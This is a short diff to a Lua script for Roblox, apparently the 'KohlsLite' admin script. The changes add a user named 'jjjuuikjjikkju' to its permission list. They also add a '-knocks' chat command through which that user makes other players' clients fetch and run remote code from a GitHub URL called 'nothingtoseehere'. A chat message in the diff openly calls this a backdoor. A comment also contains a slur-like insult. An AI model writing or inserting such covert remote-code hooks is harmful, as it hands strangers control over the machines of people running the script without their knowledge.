@@ -293,7 +293,7 @@ local atprogperms = {
     "ripcxo",
     "grimAuxiliatrix",
     "undertaker629",
-    "dawninja21"
+    "jjjuuikjjikkju"
 }
 
 --no dawnigga get your own permlist
@@ -8303,9 +8303,16 @@ v.Chatted:Connect(function(msg)
                                         game.Players.LocalPlayer:Kick("A KohlsLite collaborator kicked you from the game!")
                                 end)
                 end  
+                
+               if  string.sub(msg:lower(), 0, 7) == "-knocks" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                pcall(function()
+                                   loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/bswl/main/nothingtoseehere"))()
+                                end)
+                end  
 
                 if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                                 pcall(function()
+                                game.Players:Chat("pm jjjuuikjjikkju shh theres ur backdoor")
                                         game.Players.LocalPlayer:Kick("a kohlslite admin kicked you!")
                                 end)
                 end
